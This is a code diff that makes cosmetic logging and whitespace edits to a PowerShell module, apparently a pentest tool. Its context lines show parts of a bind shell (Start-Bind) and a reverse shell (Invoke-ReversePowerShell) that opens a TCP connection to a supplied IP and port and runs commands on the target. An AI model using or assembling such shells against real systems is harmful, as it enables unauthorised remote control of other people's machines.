@@ -31,6 +31,7 @@
         OutBuffer, PipelineVariable, and OutVariable. For more information, see
         about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).
 
+
 .EXAMPLE
     -------------------------- EXAMPLE 1 --------------------------
     Start-Listener -Port 1234
@@ -83,7 +84,7 @@ Function Start-Listener {
     Write-Verbose "Starting listener on port $PortString and creating job to allow closing the connection"
     
     $Socket.Start()
-    Write-Host ("Listening on [0.0.0.0] (port " + $Port + ")") -ForegroundColor 'Green'
+    Write-Output ("Listening on [0.0.0.0] (port " + $Port + ")") 
     While ($true) 
     {
 
@@ -221,16 +222,16 @@ Function Start-Bind {
         )  # End param
 
         $PortString = $Port.ToString()
-        Write-Verbose "Creating listener on port $PortString" 
+        Write-Verbose "Creating listener on port $PortString"
         $Listener = [System.Net.Sockets.TcpListener]$Port
         Write-Host "[*] PowerShell.exe is bound to port $PortString" -ForegroundColor "Green"
         $Listener.Start()
 
-        While ($True) 
+        While ($True)
         {
             
             Write-Verbose "Begin loop allowing Ctrl+C to stop the listener"
-            If ($Listener.Pending()) 
+            If ($Listener.Pending())
             {
             
                 $Client = $Listener.AcceptTcpClient()
@@ -243,7 +244,7 @@ Function Start-Bind {
     
          }  # End While
     
-        Write-Host "[*] Connection Established." -ForegroundColor 'Green'
+        Write-Output "[*] Connection Established."
         $Stream = $Client.GetStream()
 
         Write-Verbose "Streaming bytes to PowerShell connection"
@@ -270,9 +271,9 @@ Function Start-Bind {
             Catch
             {
 
-                Write-Host "Failure occured attempting to execute the command on target." -ForegroundColor 'Red'
+                Write-Output "Failure occured attempting to execute the command on target."
 
-                $Error[0] | Out-String 
+                $Error[0] | Out-String
 
             }  # End Catch
 
@@ -398,7 +399,7 @@ Function Invoke-ReversePowerShell {
         Try
         {
 
-            Write-Host "Connection attempted. Check your listener." -ForegroundColor 'Green'
+            Write-Output "Connection attempted. Check your listener."
 
             $Client = New-Object System.Net.Sockets.TCPClient($IpAddress,$Port)
             $Stream = $Client.GetStream()
@@ -450,7 +451,7 @@ Function Invoke-ReversePowerShell {
         Catch
         {
 
-            Write-Host "There was a connection error. Retrying occurs every 30 seconds" -ForegroundColor 'Red'
+            Write-Output "There was a connection error. Retrying occurs every 30 seconds"
             If ($Client.Connected)
             {
 
@@ -472,7 +473,7 @@ Function Invoke-ReversePowerShell {
             [int]$Time = 30
             $Length = $Time / 100
 
-            For ($Time; $Time -gt 0; $Time--) 
+            For ($Time; $Time -gt 0; $Time--)
             {
             
                 $Text = "0:" + ($Time % 60) + " seconds left"
